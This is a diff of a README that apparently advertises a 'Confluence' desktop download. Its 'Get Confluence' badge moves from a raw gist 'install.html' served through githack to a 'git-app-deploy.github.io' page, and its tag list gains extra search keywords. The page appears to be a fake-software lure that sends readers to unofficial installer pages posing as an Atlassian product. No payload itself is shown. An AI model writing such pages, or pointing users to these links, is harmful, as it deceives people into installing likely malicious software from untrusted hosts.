@@ -1,6 +1,6 @@
 # Confluence Download — Desktop Collaboration Hub
 
-[![Get Confluence GitHub](https://img.shields.io/badge/Get%20Confluence%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/hawk92goodidea/d54c4f4611b2dfb67074717242a75510/raw/b1642080c1dabae4ca329d17d4660b71c11b2cfd/install.html?offer=Confluence)
+[![Get Confluence GitHub](https://img.shields.io/badge/Get%20Confluence%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deploy.github.io/.github/?offer=Confluence)
 
 ---
 
@@ -69,7 +69,7 @@ A: Confluence works seamlessly with Jira and other Atlassian tools.
 ---
 
 ## 🔍 Tags
-confluence desktop, team documentation tool, collaboration hub pc mac, knowledge base platform, project wiki management, confluence pc, confluence windows, confluence for mac, confluence for pc, confluence for windows, confluence mac
+confluence desktop, confluence pricing, confluence software, lassian confluence, confluence, team documentation tool, collaboration hub pc mac, knowledge base platform, project wiki management, confluence pc, confluence windows, confluence for mac, confluence for pc, confluence for windows, confluence mac
 
 ---
 
